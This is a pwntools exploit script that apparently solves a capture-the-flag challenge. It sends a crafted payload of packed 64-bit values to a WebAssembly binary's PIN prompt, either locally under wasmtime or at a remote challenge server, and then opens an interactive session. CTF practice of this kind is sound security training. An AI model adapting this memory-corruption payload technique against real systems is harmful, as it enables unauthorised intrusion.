#!/usr/bin/env python3

from pwn import *
import time

# exe = ELF("./")

# context.binary = {bin_name}
context.arch = "amd64"

if args.LOCAL:
    p = process(["wasmtime", "-g", "--dir", "./", "--config", "./cache.toml", "./chall"])
    if args.GDB:
        gdb.attach(p)
        pause()
else:
    p = remote("challs.nusgreyhats.org", 30212)

# good luck pwning :)
payload = flat(
    *((0x0,)*7),
    0x0000001100000000,
    0x000018e0000018e0,
    0x0000003200000010,
    0x0000000300012350,
    *((0x0,)*4),
    0x0000001300000000,
    0x0,
    0x0000048100000000,
    0x0001235800012358,
    0x0,
    0x00000004000019e8,
    0x0000000300000000,
    0x0000000100000002,
    0x00000400000123d8,
    0x0,
    0xffffffff00000004,
    0x00000000ffffffff,
    *((0x0,)*134),
    0x0000005200000480,
    0x0,
)
p.sendlineafter(b"PIN:", payload)

p.interactive()